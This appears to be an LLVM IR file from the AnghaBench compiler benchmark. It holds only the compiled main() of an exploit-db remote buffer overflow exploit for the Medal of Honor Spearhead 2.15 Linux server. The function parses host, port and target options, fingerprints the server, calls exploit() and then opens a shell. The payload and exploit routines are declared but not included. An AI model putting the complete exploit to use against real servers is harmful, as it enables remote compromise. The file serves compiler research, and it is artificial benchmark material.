; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_826.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_826.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i64 }

@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [53 x i8] c"===================================================\0A\00", align 1
@.str.1 = private unnamed_addr constant [53 x i8] c"Medal of Honor Spearhead Dedicated server for Linux\0A\00", align 1
@.str.2 = private unnamed_addr constant [49 x i8] c"Remote buffer overflow exploit millhouse@IRCnet\0A\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"h:p:t:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [28 x i8] c"[-] Specified port invalid\0A\00", align 1
@.str.5 = private unnamed_addr constant [43 x i8] c"[-] Remote server is not a Spearhead 2.15\0A\00", align 1
@.str.6 = private unnamed_addr constant [41 x i8] c"[-] server or its running under Windows\0A\00", align 1
@.str.7 = private unnamed_addr constant [34 x i8] c"[-] Found Spearhead 2.15 (Linux)\0A\00", align 1
@.str.8 = private unnamed_addr constant [20 x i8] c"[-] Target: 0x%08x \00", align 1
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str.9 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.10 = private unnamed_addr constant [23 x i8] c"[-] Sending buffer...\0A\00", align 1
@.str.11 = private unnamed_addr constant [16 x i8] c"[-] Leaving...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [256 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %11, align 4
  %13 = load i32, i32* @stdout, align 4
  %14 = call i32 @fprintf(i32 %13, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str, i64 0, i64 0))
  %15 = load i32, i32* @stdout, align 4
  %16 = call i32 @fprintf(i32 %15, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.1, i64 0, i64 0))
  %17 = load i32, i32* @stdout, align 4
  %18 = call i32 @fprintf(i32 %17, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.2, i64 0, i64 0))
  %19 = load i32, i32* @stdout, align 4
  %20 = call i32 @fprintf(i32 %19, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str, i64 0, i64 0))
  %21 = getelementptr inbounds [256 x i8], [256 x i8]* %6, i64 0, i64 0
  %22 = call i32 @memset(i8* %21, i32 0, i32 256)
  br label %23

23:                                               ; preds = %66, %2
  %24 = load i32, i32* %4, align 4
  %25 = load i8**, i8*** %5, align 8
  %26 = call i32 @getopt(i32 %24, i8** %25, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  store i32 %26, i32* %7, align 4
  %27 = load i32, i32* @EOF, align 4
  %28 = icmp ne i32 %26, %27
  br i1 %28, label %29, label %67

29:                                               ; preds = %23
  %30 = load i32, i32* %7, align 4
  switch i32 %30, label %61 [
    i32 104, label %31
    i32 112, label %35
    i32 116, label %47
  ]

31:                                               ; preds = %29
  %32 = getelementptr inbounds [256 x i8], [256 x i8]* %6, i64 0, i64 0
  %33 = load i32, i32* @optarg, align 4
  %34 = call i32 @strncpy(i8* %32, i32 %33, i32 255)
  br label %66

35:                                               ; preds = %29
  %36 = load i32, i32* @optarg, align 4
  %37 = call i32 @atoi(i32 %36)
  store i32 %37, i32* %8, align 4
  %38 = load i32, i32* %8, align 4
  %39 = icmp sle i32 %38, 0
  br i1 %39, label %43, label %40

40:                                               ; preds = %35
  %41 = load i32, i32* %8, align 4
  %42 = icmp sgt i32 %41, 65535
  br i1 %42, label %43, label %46

43:                                               ; preds = %40, %35
  %44 = load i32, i32* @stderr, align 4
  %45 = call i32 @fprintf(i32 %44, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.4, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %117

46:                                               ; preds = %40
  br label %66

47:                                               ; preds = %29
  %48 = load i32, i32* @optarg, align 4
  %49 = call i32 @atoi(i32 %48)
  store i32 %49, i32* %11, align 4
  %50 = load i32, i32* %11, align 4
  %51 = icmp slt i32 %50, 1
  br i1 %51, label %55, label %52

52:                                               ; preds = %47
  %53 = load i32, i32* %11, align 4
  %54 = icmp sgt i32 %53, 6
  br i1 %54, label %55, label %60

55:                                               ; preds = %52, %47
  %56 = load i8**, i8*** %5, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 0
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @usage(i8* %58)
  br label %60

60:                                               ; preds = %55, %52
  br label %66

61:                                               ; preds = %29
  %62 = load i8**, i8*** %5, align 8
  %63 = getelementptr inbounds i8*, i8** %62, i64 0
  %64 = load i8*, i8** %63, align 8
  %65 = call i32 @usage(i8* %64)
  br label %66

66:                                               ; preds = %61, %60, %46, %31
  br label %23

67:                                               ; preds = %23
  %68 = getelementptr inbounds [256 x i8], [256 x i8]* %6, i64 0, i64 0
  %69 = call i64 @strlen(i8* %68)
  %70 = icmp eq i64 %69, 0
  br i1 %70, label %71, label %76

71:                                               ; preds = %67
  %72 = load i8**, i8*** %5, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 0
  %74 = load i8*, i8** %73, align 8
  %75 = call i32 @usage(i8* %74)
  br label %76

76:                                               ; preds = %71, %67
  %77 = getelementptr inbounds [256 x i8], [256 x i8]* %6, i64 0, i64 0
  %78 = load i32, i32* %8, align 4
  %79 = call i32 @getinfo(i8* %77, i32 %78)
  store i32 %79, i32* %9, align 4
  %80 = load i32, i32* %9, align 4
  %81 = icmp slt i32 %80, 0
  br i1 %81, label %82, label %87

82:                                               ; preds = %76
  %83 = load i32, i32* @stderr, align 4
  %84 = call i32 @fprintf(i32 %83, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.5, i64 0, i64 0))
  %85 = load i32, i32* @stderr, align 4
  %86 = call i32 @fprintf(i32 %85, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.6, i64 0, i64 0))
  br label %114

87:                                               ; preds = %76
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.7, i64 0, i64 0))
  %89 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %90 = load i32, i32* %11, align 4
  %91 = sub nsw i32 %90, 1
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %89, i64 %92
  %94 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %93, i32 0, i32 1
  %95 = load i64, i64* %94, align 8
  %96 = trunc i64 %95 to i32
  %97 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.8, i64 0, i64 0), i32 %96)
  %98 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %99 = load i32, i32* %11, align 4
  %100 = sub nsw i32 %99, 1
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %98, i64 %101
  %103 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %102, i32 0, i32 0
  %104 = load i8*, i8** %103, align 8
  %105 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0), i8* %104)
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.10, i64 0, i64 0))
  %107 = getelementptr inbounds [256 x i8], [256 x i8]* %6, i64 0, i64 0
  %108 = load i32, i32* %8, align 4
  %109 = load i32, i32* %11, align 4
  %110 = call i32 @exploit(i8* %107, i32 %108, i32 %109)
  %111 = call i32 @sleep(i32 3)
  %112 = getelementptr inbounds [256 x i8], [256 x i8]* %6, i64 0, i64 0
  %113 = call i32 @shell(i8* %112)
  br label %114

114:                                              ; preds = %87, %82
  %115 = load i32, i32* @stderr, align 4
  %116 = call i32 @fprintf(i32 %115, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.11, i64 0, i64 0))
  br label %117

117:                                              ; preds = %114, %43
  %118 = load i32, i32* %3, align 4
  ret i32 %118
}

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @strncpy(i8*, i32, i32) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @getinfo(i8*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @exploit(i8*, i32, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @shell(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
